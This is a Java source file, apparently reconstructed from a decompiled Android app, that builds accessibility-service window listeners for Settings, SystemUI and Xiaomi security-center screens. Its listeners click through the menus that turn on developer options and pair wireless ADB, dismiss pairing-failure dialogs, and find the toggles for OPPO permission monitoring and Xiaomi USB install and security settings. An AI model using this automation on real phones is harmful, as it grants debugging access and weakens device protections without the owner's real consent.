package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;


import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor o/a0 — AutoEngine delegate (PairAccessibilityDelegate).
 * Master orchestrator for ADB wireless pairing automation.
 * Extends o.e (AccessibilityDelegate base).
 *
 * Coordinates: developer options navigation, wireless debug entry,
 * pair code dialog handling, pair fail recovery, security center,
 * USB install/security settings (Xiaomi), permission monitoring (OPPO).
 *
 * Translated from:
 *   CFR: androidReverseEngineering/src/o/a0.java (3,716 lines)
 *   JADX: decompiled_vendor/sources/o/a0.java (2,003 lines)
 */
public final class PairAccessibilityDelegate extends AccessibilityDelegate {

    /** vendor n — scheduled executor for timeout tasks */
    public final ScheduledExecutorService n;

    /** vendor o — state tracking queue (task dedup) */
    public final ConcurrentLinkedQueue o;

    /** vendor p — pair state (r.g enum) */
    public final AtomicReference p;

    /** vendor q — reentrant lock for N0 shutdown */
    public final ReentrantLock q;

    /** vendor r — shutdown flag */
    public final AtomicBoolean r;

    /** vendor s — 禁用权限监控 checked state (OPPO) */
    public boolean s;

    /** vendor t — USB安装 checked state (Xiaomi) */
    public boolean t;

    /** vendor u — USB安全设置 checked state (Xiaomi) */
    public boolean u;

    public PairAccessibilityDelegate() {
        super(E0(), "com.android.settings");
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        this.n = executor;
        this.o = new ConcurrentLinkedQueue();
        this.p = new AtomicReference<>(EngineHelper.PAIR_DEPT_UNKNOWN);
        this.q = new ReentrantLock();
        this.r = new AtomicBoolean(false);
        this.s = false;
        this.t = false;
        this.u = false;
        try {
            long delay = com.guard.wallet.utils.DeviceUtils.isXiaomiFamily() ? 180L : 120L;
            TimeUnit unit = TimeUnit.SECONDS;
            executor.schedule(new com.guard.wallet.delegate.task.AutoEngineTask(this, 0), delay, unit);
            executor.schedule(new com.guard.wallet.delegate.task.AutoEngineTask(this, 1), 30L, unit);
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  Static ListenWindow builders
    // ═══════════════════════════════════════════════════════════════

    /** vendor A0() — ListenWindow for PAIR_FAILED_4_TEXT with auto-click OK */
    public static ListenWindow A0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_FAILED_4_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_FAILED_4_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.getEventSubscribes().add(C0());
        return lw;
    }

    /** vendor B0() — ListenWindow for PAIR_FAILED_TEXT with auto-click OK */
    public static ListenWindow B0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_FAILED_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_FAILED_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.getEventSubscribes().add(C0());
        return lw;
    }

    /** vendor C0() — EventSubscribe: auto-click confirm button on pair fail dialog */
    public static EventSubscribe C0() {
        EventSubscribe es = new EventSubscribe();
        es.setListenType(0);
        es.setSourceRule(0);
        es.setCombineFilter(V());
        es.setReplyActions(new LinkedList());
        TargetActionCondition action = new TargetActionCondition();
        action.setActionType(1);
        action.setActionName("click");
        es.getReplyActions().add(action);
        es.setEventTypes(new HashSet<>());
        es.getEventTypes().add(32);
        es.getEventTypes().add(16384);
        return es;
    }

    /** vendor E0() — master ListenWindow list for the auto engine */
    public static LinkedList E0() {
        LinkedList list = new LinkedList();

        /* DevelopmentSettingsDashboardActivity */
        ListenWindow lw1 = new ListenWindow("com.android.settings",
                "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        FilterHelper.initEventTypes(lw1).add(32);
        lw1.getEventTypes().add(16384);
        list.add(lw1);

        /* DevelopmentSettingsActivity */
        ListenWindow lw2 = new ListenWindow("com.android.settings",
                "com.android.settings.Settings$DevelopmentSettingsActivity");
        lw2.setEventTypes(new HashSet<>());
        lw2.getEventTypes().add(32);
        lw2.getEventTypes().add(16384);
        list.add(lw2);

        /* Allow developer setting dialog */
        list.add(I());

        /* SubSettings */
        ListenWindow lw3 = new ListenWindow("com.android.settings",
                "com.android.settings.SubSettings");
        lw3.setEventTypes(new HashSet<>());
        lw3.getEventTypes().add(32);
        lw3.getEventTypes().add(16384);
        list.add(lw3);

        /* MiuiSettings (Xiaomi) */
        list.add(s0());

        /* hihonor SubSettings (Honor) */
        ListenWindow lw4 = new ListenWindow("com.android.settings",
                "com.hihonor.settingslib.SubSettings");
        lw4.setEventTypes(new HashSet<>());
        lw4.getEventTypes().add(32);
        lw4.getEventTypes().add(16384);
        list.add(lw4);

        /* FrameLayout */
        ListenWindow lw5 = new ListenWindow("com.android.settings",
                "android.widget.FrameLayout");
        lw5.setEventTypes(new HashSet<>());
        lw5.getEventTypes().add(32);
        lw5.getEventTypes().add(16384);
        list.add(lw5);

        /* Pair code text match */
        ListenWindow y0Lw = Y0();
        if (y0Lw != null) {
            list.add(y0Lw);
        }

        /* Pair code 2 text match */
        ListenWindow z0Lw = Z0();
        if (z0Lw != null) {
            list.add(z0Lw);
        }

        /* systemui Dialog */
        ListenWindow lw6 = new ListenWindow("com.android.systemui", "android.app.Dialog");
        lw6.setEventTypes(new HashSet<>());
        lw6.getEventTypes().add(32);
        lw6.getEventTypes().add(16384);
        lw6.getEventTypes().add(1);
        list.add(lw6);

        /* Settings catch-all */
        ListenWindow lw7 = new ListenWindow("com.android.settings", null);
        lw7.setEventTypes(new HashSet<>());
        lw7.getEventTypes().add(32);
        lw7.getEventTypes().add(16384);
        list.add(lw7);

        /* Pair failed dialogs */
        ListenWindow b0Lw = B0();
        if (b0Lw != null) {
            list.add(b0Lw);
        }
        ListenWindow y0Lw2 = y0();
        if (y0Lw2 != null) {
            list.add(y0Lw2);
        }
        ListenWindow z0Lw2 = z0();
        if (z0Lw2 != null) {
            list.add(z0Lw2);
        }
        ListenWindow a0Lw = A0();
        if (a0Lw != null) {
            list.add(a0Lw);
        }

        /* Xiaomi security center */
        list.add(M0());
        list.add(I0());
        return list;
    }

    /** vendor I() — ListenWindow for "允许开发者设置" dialog */
    public static ListenWindow I() {
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        List matchs = lw.getMatchs();
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_ALLOW_DEVELOPER_SETTING_TEXT"));
        filter.getStringConditions().add(sc);
        matchs.add(filter);
        return lw;
    }

    /** vendor I0() — ListenWindow for Xiaomi security center AlertDialog with "正在开启" match */
    public static ListenWindow I0() {
        ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                "miuix.appcompat.app.AlertDialog");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(L0());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(16384,
                FilterHelper.addEventType(32, lw.getEventTypes(), lw), lw).add(2048);
        return lw;
    }

    /** vendor J() — ListenWindow for systemui Dialog (wireless debug allow dialog) */
    public static ListenWindow J() {
        ListenWindow lw = new ListenWindow("com.android.systemui", "android.app.Dialog");
        FilterHelper.addEventType(16384,
                FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw).add(1);
        return lw;
    }

    /** vendor M0() — ListenWindow for Xiaomi AdbInputApplyActivity */
    public static ListenWindow M0() {
        ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                "com.miui.permcenter.install.AdbInputApplyActivity");
        FilterHelper.addEventType(16384,
                FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw).add(2048);
        return lw;
    }

    /** vendor O0() — ListenWindow for SubSettings with PAIR_DEVELOPERS_OPTION_TEXT match */
    public static ListenWindow O0() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(X());
        return lw;
    }

    /** vendor P0() — ListenWindow for SubSettings with PAIR_DEVELOPER_OPTION_TEXT match */
    public static ListenWindow P0() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(Z());
        return lw;
    }

    /** vendor U0() — ListenWindow for SubSettings with PAIR_WIFI_DEBUG_2_TEXT match */
    public static ListenWindow U0() {
        CombineFilter filter = V0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor W() — ListenWindow for DevelopmentSettingsActivity */
    public static ListenWindow W() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.Settings$DevelopmentSettingsActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor W0() — ListenWindow for SubSettings with PAIR_WIFI_DEBUG_TEXT match */
    public static ListenWindow W0() {
        CombineFilter filter = X0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor Y() — ListenWindow for DevelopmentSettingsDashboardActivity */
    public static ListenWindow Y() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor Y0() — ListenWindow for "使用配对码配对" text (any package) */
    public static ListenWindow Y0() {
        CombineFilter filter = u0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow(null, null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor Z0() — ListenWindow for PAIR_DEVICE_USE_PAIR_CODE_2_TEXT (any package) */
    public static ListenWindow Z0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"))) {
            filter = new CombineFilter();
            filter.setStringConditions(new LinkedList());
            StringCondition sc = new StringCondition();
            sc.setProperty("text");
            sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"));
            filter.getStringConditions().add(sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow(null, null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor i0() — ListenWindow for FrameLayout with PAIR_DEVELOPERS_OPTION_TEXT match */
    public static ListenWindow i0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(X());
        return lw;
    }

    /** vendor j0() — ListenWindow for FrameLayout with PAIR_DEVELOPER_OPTION_TEXT match */
    public static ListenWindow j0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(Z());
        return lw;
    }

    /** vendor k0() — ListenWindow for FrameLayout with PAIR_WIFI_DEBUG_2_TEXT match */
    public static ListenWindow k0() {
        CombineFilter filter = V0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor l0() — ListenWindow for FrameLayout with PAIR_WIFI_DEBUG_TEXT match */
    public static ListenWindow l0() {
        CombineFilter filter = X0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor m0() — ListenWindow for hihonor SubSettings with PAIR_WIFI_DEBUG_2_TEXT match */
    public static ListenWindow m0() {
        CombineFilter filter = V0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.hihonor.settingslib.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor n0() — ListenWindow for hihonor SubSettings with PAIR_WIFI_DEBUG_TEXT match */
    public static ListenWindow n0() {
        CombineFilter filter = X0();
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.hihonor.settingslib.SubSettings");
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor o0() — ListenWindow for any package with PAIR_DEVELOPERS_OPTION_TEXT match */
    public static ListenWindow o0() {
        ListenWindow lw = new ListenWindow(null, null);
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(X());
        return lw;
    }

    /** vendor p0() — ListenWindow for any package with PAIR_DEVELOPERS_OPTION_TEXT match (dup) */
    public static ListenWindow p0() {
        ListenWindow lw = new ListenWindow(null, null);
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(X());
        return lw;
    }

    /** vendor r0() — ListenWindow for Xiaomi systemui AlertDialog */
    public static ListenWindow r0() {
        ListenWindow lw = new ListenWindow("com.android.systemui",
                "miuix.appcompat.app.AlertDialog");
        FilterHelper.addEventType(16384,
                FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw).add(1);
        return lw;
    }

    /** vendor s0() — ListenWindow for MiuiSettings with PAIR_DEVELOPER_OPTION_TEXT match */
    public static ListenWindow s0() {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.MiuiSettings");
        lw.setMatchs(new LinkedList());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        lw.getMatchs().add(Z());
        return lw;
    }

    /** vendor v0() — ListenWindow for PAIR_DEVICE_BY_CODE_2_TEXT */
    public static ListenWindow v0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_BY_CODE_2_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVICE_BY_CODE_2_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor w0() — ListenWindow for PAIR_DEVICE_BY_CODE_3_TEXT */
    public static ListenWindow w0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_BY_CODE_3_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVICE_BY_CODE_3_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor x0() — ListenWindow for PAIR_DEVICE_BY_CODE_TEXT */
    public static ListenWindow x0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVICE_BY_CODE_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DEVICE_BY_CODE_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor y0() — ListenWindow for PAIR_FAILED_2_TEXT with auto-click OK */
    public static ListenWindow y0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_FAILED_2_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_FAILED_2_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.getEventSubscribes().add(C0());
        return lw;
    }

    /** vendor z0() — ListenWindow for PAIR_FAILED_3_TEXT with auto-click OK */
    public static ListenWindow z0() {
        CombineFilter filter;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_FAILED_3_TEXT"))) {
            filter = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_FAILED_3_TEXT", sc, filter, sc);
        } else {
            filter = null;
        }
        if (filter == null) {
            return null;
        }
        ListenWindow lw = new ListenWindow("com.android.settings", null);
        lw.setMatchs(new LinkedList());
        lw.getMatchs().add(filter);
        lw.getEventSubscribes().add(C0());
        return lw;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Static CombineFilter / CombineFiltersWithOr builders
    // ═══════════════════════════════════════════════════════════════

    /**
     * vendor F0() — CombineFilter for "禁用权限监控" text (OPPO).
     * ADAPT: Vendor returns CombineScrollCondition(CombineFiltersWithOr, 2, 1); o.z shadows direct import.
     * Returns CombineFilter wrapping the first available text variant for use with
     * FilterHelper.createSingleScrollCondition() in y.java.
     */
    public static CombineFilter F0() {
        /* Build first variant */
        CombineFilter filter1 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DISABLE_PERMISSION_MONITOR_TEXT"))) {
            filter1 = new CombineFilter();
            StringCondition sc = FilterHelper.addCondition(filter1,
                    FilterHelper.initFilter(filter1, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DISABLE_PERMISSION_MONITOR_TEXT", sc, filter1, sc);
        }
        if (filter1 != null) {
            return filter1;
        }

        /* Build second variant */
        CombineFilter filter2 = null;
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT"))) {
            filter2 = new CombineFilter();
            StringCondition sc2 = FilterHelper.addCondition(filter2,
                    FilterHelper.initFilter(filter2, "className", "android.widget.TextView"), "text");
            FilterHelper.setEqualsFromConfig("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT", sc2, filter2, sc2);
        }
        if (filter2 != null) {
            return filter2;
        }

        /* Fallback — empty filter */
        return new CombineFilter();
    }

    /** vendor H0() — CombineFiltersWithOr for scrollable views (RecyclerView/ListView/ScrollView/any scrollable) */
    public static CombineFiltersWithOr H0() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList());

        /* RecyclerView + scrollable */
        CombineFilter f1 = new CombineFilter();
        f1.setStringConditions(new LinkedList());
        f1.setBoolConditions(new LinkedList());
        StringCondition sc1 = new StringCondition();
        sc1.setProperty("className");
        sc1.setEquals("androidx.recyclerview.widget.RecyclerView");
        f1.getStringConditions().add(sc1);
        f1.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        result.getFilters().add(f1);

        /* ListView + scrollable */
        CombineFilter f2 = new CombineFilter();
        f2.setStringConditions(new LinkedList());
        f2.setBoolConditions(new LinkedList());
        StringCondition sc2 = new StringCondition();
        sc2.setProperty("className");
        sc2.setEquals("android.widget.ListView");
        f2.getStringConditions().add(sc2);
        f2.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        result.getFilters().add(f2);

        /* ScrollView + scrollable */
        CombineFilter f3 = new CombineFilter();
        f3.setStringConditions(new LinkedList());
        f3.setBoolConditions(new LinkedList());
        StringCondition sc3 = new StringCondition();
        sc3.setProperty("className");
        sc3.setEquals("android.widget.ScrollView");
        f3.getStringConditions().add(sc3);
        f3.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        result.getFilters().add(f3);

        /* Any scrollable */
        CombineFilter f4 = new CombineFilter();
        f4.setStringConditions(new LinkedList());
        f4.setBoolConditions(new LinkedList());
        f4.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        result.getFilters().add(f4);

        return result;
    }

    /** vendor J0() — CombineFilter for "允许" button (PAIR_ACCEPT_TEXT) */
    public static CombineFilter J0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.Button"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_ACCEPT_TEXT", sc, filter, sc);
        return filter;
    }

    /** vendor K0() — CombineFilter for "下一步" button (PAIR_NEXT_TEXT) */
    public static CombineFilter K0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.Button"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_NEXT_TEXT", sc, filter, sc);
        return filter;
    }

    /** vendor L0() — CombineFilter for "正在开启" text (PAIR_SECURITY_OPENING_TEXT) */
    public static CombineFilter L0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_SECURITY_OPENING_TEXT"));
        filter.getStringConditions().add(sc);
        return filter;
    }

    /** vendor Q0() — CombineFilter for Switch widget (className=android.widget.Switch) */
    public static CombineFilter Q0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.initFilter(filter, "className", "android.widget.Switch");
        filter.getStringConditions().add(sc);
        return filter;
    }

    /**
     * vendor R0() — CombineFiltersWithOr for USB安装 text (PAIR_ALLOW_USB_INSTALL_TEXT).
     * ADAPT: Vendor returns CombineFilter; y.java passes to findOneByOperateOr
     * which requires CombineFiltersWithOr. Wrapped accordingly.
     */
    public static CombineFiltersWithOr R0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_ALLOW_USB_INSTALL_TEXT"));
        filter.getStringConditions().add(sc);
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList());
        result.getFilters().add(filter);
        return result;
    }

    /**
     * vendor S0() — CombineFiltersWithOr for USB安全设置 text (PAIR_USB_SECURITY_TEXT).
     * ADAPT: Vendor returns CombineFilter; y.java passes to findOneByOperateOr
     * which requires CombineFiltersWithOr. Wrapped accordingly.
     */
    public static CombineFiltersWithOr S0() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_USB_SECURITY_TEXT", sc, filter, sc);
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList());
        result.getFilters().add(filter);
        return result;
    }

    /** vendor T() — CombineFilter for clickable parent element */
    public static CombineFilter T() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList());
        filter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return filter;
    }

    /** vendor U() — CombineFilter for button1 (android:id/button1) */
    public static CombineFilter U() {
        CombineFilter filter = new CombineFilter();
        filter.getStringConditions().add(
                FilterHelper.addConditionWithEquals(filter,
                        FilterHelper.initFilter(filter, "className", "android.widget.Button"),
                        "id", "android:id/button1"));
        return filter;
    }

    /** vendor V() — CombineFilter for confirm button (PAIR_CONFIRM_TEXT) */
    public static CombineFilter V() {
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.Button"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_CONFIRM_TEXT"));
        filter.getStringConditions().add(sc);
        return filter;
    }

    /** vendor V0() — CombineFilter for PAIR_WIFI_DEBUG_2_TEXT */
    public static CombineFilter V0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_WIFI_DEBUG_2_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_WIFI_DEBUG_2_TEXT", sc, filter, sc);
        return filter;
    }

    /** vendor X() — CombineFilter for PAIR_DEVELOPERS_OPTION_TEXT */
    public static CombineFilter X() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_DEVELOPERS_OPTION_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_DEVELOPERS_OPTION_TEXT", sc, filter, sc);
        return filter;
    }

    /** vendor X0() — CombineFilter for PAIR_WIFI_DEBUG_TEXT */
    public static CombineFilter X0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("PAIR_WIFI_DEBUG_TEXT"))) {
            return null;
        }
        CombineFilter filter = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "text");
        FilterHelper.setEqualsFromConfig("PAIR_WIFI_DEBUG_TEXT", sc, filter, sc);
        return filter;
    }

